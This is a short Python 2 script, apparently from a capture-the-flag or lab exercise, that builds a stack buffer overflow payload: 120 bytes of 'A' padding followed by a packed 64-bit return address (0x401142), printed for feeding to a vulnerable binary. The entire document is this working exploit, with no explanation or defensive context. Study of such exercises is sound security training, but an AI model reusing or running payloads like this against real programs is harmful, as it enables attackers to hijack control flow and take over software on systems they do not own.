import struct

offset=120

RIP=struct.pack("Q", 0x0000000000401142)

buffer = "A" * 120 + RIP

print buffer
